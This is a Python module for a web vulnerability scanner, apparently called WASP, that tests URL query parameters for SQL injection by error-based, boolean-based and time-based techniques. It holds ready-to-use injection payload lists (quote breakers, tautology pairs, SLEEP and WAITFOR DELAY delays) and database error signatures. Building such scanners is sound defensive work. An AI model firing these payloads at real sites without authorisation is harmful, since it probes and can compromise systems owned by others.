# scanner/sqli.py
"""
WASP SQL Injection Scanner — Phase 1
Three detection techniques: error-based, boolean-based, time-based.
Accepts an authenticated session directly to avoid cookie domain issues.
"""

import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import requests

from config import REQUEST_TIMEOUT, REQUEST_DELAY, USER_AGENT, SQLI_TIMEOUT_THRESHOLD
from core.logger import get_logger
from core.models import Vulnerability, Severity
from core.utils import build_cookie_jar

log = get_logger(__name__)

ERROR_PAYLOADS = [
    "'",
    "''",
    "`",
    '"',
    "\\",
    "' --",
    "' #",
    "' /*",
    "') --",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
]

BOOLEAN_PAYLOADS = [
    ("1' AND '1'='1", "1' AND '1'='2"),
    ("1 AND 1=1",     "1 AND 1=2"),
    ("1' AND 1=1--",  "1' AND 1=2--"),
    ("admin'--",      "admin' AND '1'='2"),
]

TIME_PAYLOADS = [
    "1; SELECT SLEEP(5)--",
    "1' AND SLEEP(5)--",
    "1; WAITFOR DELAY '0:0:5'--",
    "1'; WAITFOR DELAY '0:0:5'--",
    "1; SELECT pg_sleep(5)--",
]

DB_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch_array()",
    "mysql_num_rows()",
    "mysql_fetch_assoc()",
    "mysql_fetch_row()",
    "mysql_query()",
    "com.mysql.jdbc",
    "supplied argument is not a valid mysql",
    "mysql server version",
    "error: you have an error",
    "check the manual that corresponds",
    "right syntax to use near",
    "microsoft ole db provider for sql server",
    "odbc sql server driver",
    "sqlserver",
    "unclosed quotation mark",
    "ora-01756",
    "ora-00933",
    "oracle error",
    "postgresql",
    "pg_query()",
    "pg::syntaxerror",
    "sql syntax",
    "syntax error",
    "sql error",
    "database error",
    "db error",
    "invalid query",
    "quoted string not properly terminated",
    "error in your sql",
]


class SQLiScanner:
    def __init__(
        self,
        cookies: dict | None = None,
        target_url: str = "http://localhost",
        session=None,
    ):
        self.cookies   = cookies or {}
        self.findings: list[Vulnerability] = []

        if session is not None:
            self.session = session
            log.debug("SQLi scanner using provided authenticated session.")
        else:
            self.session = requests.Session()
            self.session.headers.update({"User-Agent": USER_AGENT})
            if self.cookies:
                self.session.cookies = build_cookie_jar(self.cookies, url=target_url)
                log.debug(f"SQLi scanner cookies set: {list(self.cookies.keys())}")

    def scan(self, urls: list[str]) -> list[Vulnerability]:
        injectable_urls = [u for u in urls if "?" in u]

        if not injectable_urls:
            log.warning("No URLs with query parameters found. SQLi scan skipped.")
            return []

        log.info(f"SQLi scan started. {len(injectable_urls)} injectable URL(s) to probe.")

        for url in injectable_urls:
            log.info(f"Scanning: {url}")
            self._scan_url(url)
            time.sleep(REQUEST_DELAY)

        log.info(f"SQLi scan complete. {len(self.findings)} vulnerability/vulnerabilities found.")
        return self.findings

    def _scan_url(self, url: str) -> None:
        params = self._extract_params(url)
        for param_name in params:
            log.debug(f"  Testing parameter: '{param_name}'")
            self._test_error_based(url, param_name)
            self._test_boolean_based(url, param_name)
            self._test_time_based(url, param_name)

    def _test_error_based(self, url: str, param: str) -> None:
        for payload in ERROR_PAYLOADS:
            injected_url  = self._inject_payload(url, param, payload)
            response_text = self._fetch(injected_url)

            if response_text is None:
                continue

            matched_error = self._find_db_error(response_text)
            if matched_error:
                log.warning(
                    f"[ERROR-BASED SQLi] {url} | param='{param}' | "
                    f"payload='{payload}' | matched='{matched_error}'"
                )
                self.findings.append(Vulnerability(
                    vuln_type   = "SQL Injection (Error-based)",
                    url         = url,
                    parameter   = param,
                    payload     = payload,
                    severity    = Severity.HIGH,
                    description = (
                        f"The parameter '{param}' is vulnerable to error-based SQL "
                        f"injection. DB error '{matched_error}' was reflected in the response."
                    ),
                    evidence    = matched_error,
                ))
                return

    def _test_boolean_based(self, url: str, param: str) -> None:
        for true_payload, false_payload in BOOLEAN_PAYLOADS:
            true_url  = self._inject_payload(url, param, true_payload)
            false_url = self._inject_payload(url, param, false_payload)

            true_resp  = self._fetch(true_url)
            false_resp = self._fetch(false_url)
            baseline   = self._fetch(url)

            if true_resp is None or false_resp is None or baseline is None:
                continue

            true_len  = len(true_resp)
            false_len = len(false_resp)
            base_len  = len(baseline)

            if abs(true_len - base_len) < 50 and abs(false_len - base_len) > 100:
                log.warning(f"[BOOLEAN-BASED SQLi] {url} | param='{param}'")
                self.findings.append(Vulnerability(
                    vuln_type   = "SQL Injection (Boolean-based)",
                    url         = url,
                    parameter   = param,
                    payload     = f"TRUE: {true_payload} | FALSE: {false_payload}",
                    severity    = Severity.HIGH,
                    description = (
                        f"Parameter '{param}' shows different response lengths "
                        f"for TRUE ({true_len}b) vs FALSE ({false_len}b) SQL conditions."
                    ),
                    evidence    = f"Baseline:{base_len}b | True:{true_len}b | False:{false_len}b",
                ))
                return

    def _test_time_based(self, url: str, param: str) -> None:
        for payload in TIME_PAYLOADS:
            injected_url  = self._inject_payload(url, param, payload)
            start         = time.time()
            response_text = self._fetch(injected_url, timeout=15)
            elapsed       = time.time() - start

            if response_text is None:
                continue

            if elapsed >= SQLI_TIMEOUT_THRESHOLD:
                log.warning(
                    f"[TIME-BASED SQLi] {url} | param='{param}' | delay={elapsed:.2f}s"
                )
                self.findings.append(Vulnerability(
                    vuln_type   = "SQL Injection (Time-based)",
                    url         = url,
                    parameter   = param,
                    payload     = payload,
                    severity    = Severity.HIGH,
                    description = (
                        f"Parameter '{param}' caused {elapsed:.1f}s delay with SLEEP payload."
                    ),
                    evidence    = f"Response time: {elapsed:.2f}s",
                ))
                return

    def _extract_params(self, url: str) -> list[str]:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return list(params.keys())

    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        new_params = {}
        for key, values in params.items():
            new_params[key] = [payload] if key == param else values

        new_query  = urlencode(new_params, doseq=True)
        new_parsed = parsed._replace(query=new_query)
        return urlunparse(new_parsed)

    def _fetch(self, url: str, timeout: int = REQUEST_TIMEOUT) -> str | None:
        try:
            response = self.session.get(url, timeout=timeout, allow_redirects=True)
            if "login" in response.url and "login" not in url:
                log.debug(f"Redirected to login: {url}")
                return None
            return response.text
        except requests.exceptions.Timeout:
            log.debug(f"Timeout: {url}")
            return None
        except requests.exceptions.RequestException as e:
            log.debug(f"Request error: {url} — {e}")
            return None

    def _find_db_error(self, response_text: str) -> str | None:
        lower_text = response_text.lower()
        for signature in DB_ERROR_SIGNATURES:
            if signature.lower() in lower_text:
                return signature
        return None